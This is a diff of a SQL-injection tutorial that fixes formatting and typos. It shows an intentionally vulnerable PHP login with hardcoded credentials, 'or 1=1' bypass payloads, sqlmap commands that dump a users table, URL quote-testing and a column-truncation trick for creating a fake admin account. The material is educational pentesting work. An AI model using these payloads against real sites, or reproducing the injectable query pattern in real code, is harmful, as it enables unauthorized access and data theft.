@@ -17,21 +17,18 @@ sqlmap -u http://192.168.1.101 --dbms=mysql --crawl=3
 
 So we have a website that is written in php. We have a login functionality, where the code looks like this:
 
-```
-<?php
-	mysql_connect("localhost", "pelle", "mySecretPassowrd") or die(mysql_error());
+```php
+mysql_connect("localhost", "pelle", "mySecretPassowrd") or die(mysql_error());
 
-	mysql_select_db("myHomepage");
-	
-	if ($_POST['uname'] != ""){
-		$username = $_POST['username'];
-		$password = $_POST['password'];
-		$query = "SELECT * FROM users WHERE username = '$username' AND password='$password'";
-		$result = mysql_query($query);
+mysql_select_db("myHomepage");
 
-		$row = mysql_fetch_array($result);
-	}
-?>
+if ($_POST['uname'] != ""){
+	$username = $_POST['username'];
+	$password = $_POST['password'];
+	$query = "SELECT * FROM users WHERE username = '$username' AND password='$password'";
+	$result = mysql_query($query);
+	$row = mysql_fetch_array($result);
+}
 ```
 
 So the user input is not filtered or sanitized in any way. Which means that what the users puts in in the login-form will be executed my mysql. So just like in xss-injections we just try to escape the input field to be able to execute sql-commands. So if we input the following into the user-field and password-field in the login:
@@ -42,6 +39,7 @@ whatever' or '1'='1
 ```
 
 The query will look like this:
+
 ```
 $query = "SELECT * FROM users WHERE username = 'whatever' OR '1'='1' AND password='whatever' OR '1'='1'";
 ```
@@ -58,11 +56,11 @@ $query = "SELECT * FROM users WHERE username = 'admin' AND password='whatever' O
 
 ## SQLmap
 
-Sqlmap is a great tool to perform sqlinjections.
+Sqlmap is a great tool to perform sql-injections.
 Here is the manual.
 https://github.com/sqlmapproject/sqlmap/wiki/Usage
 
-### Using sqmap with login-page
+### Using sqlmap with login-page
 
 So you need to authenticate before you can access the vulnerable paramter.
 
@@ -95,18 +93,14 @@ sqlmap -r request.txt -p username --dbms=mysql --dump -D Webapp -T Users
 ```
 
 **Proxy credencials**
+
 ```
 --proxy-cred="username:password"
 ```
 
 
-Here is a tutorial on how to make sql-injections with post-requests.
-
-https://hackertarget.com/sqlmap-post-request-injection/
-
 
 ## Login bypass
-
 
 
 This is the most classic, standard first test:
@@ -168,8 +162,8 @@ http://example.com/photoalbum.php?id=1
 
 #### Step 1 - Add the tick '
 
-So first we should try to break the sql-syntaxt by adding a **'**.
-We should first ad a **'** or a **"**. 
+So first we should try to break the sql-syntaxt by adding a `'`.
+We should first ad a `'` or a `"`. 
 
 ```
 http://example.com/photoalbum.php?id=1'
@@ -289,14 +283,13 @@ Two things are needed for it to work:
 
 - If the username column in the database has a character-limit the rest of the characters are truncated, that is removed. So if the database has a column-limit of 20 characters and we input a string with 21 characters the last 1 character will be removed.
 
-With this information we can create a new admin-user and have our own password set to it. So if the max-length is 20 characters we can inser teh following string
+With this information we can create a new admin-user and have our own password set to it. So if the max-length is 20 characters we can insert the following string
 
 ```
 admin               removed
 ```
-This means that the "removed" part will be removed/truncated/deleted. And the trailing spaces will be removed upon insert in the database. So it will effectivly be inserted as "admin".
 
-
+This means that the "removed" part will be removed/truncated/deleted. And the trailing spaces will be removed upon insert in the database. So it will effectively be inserted as "admin".
 
 
 
